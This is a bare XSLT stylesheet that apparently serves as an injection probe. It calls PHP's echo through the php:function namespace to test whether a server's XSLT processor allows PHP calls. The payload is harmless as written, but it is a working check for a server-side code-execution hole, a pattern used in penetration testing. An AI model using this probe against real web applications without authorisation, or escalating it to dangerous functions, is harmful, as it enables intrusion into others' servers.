<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" exclude-result-prefixes="php">
<xsl:template match="/">
<xsl:value-of select="php:function('echo', '1')"/>
</xsl:template>
</xsl:stylesheet>
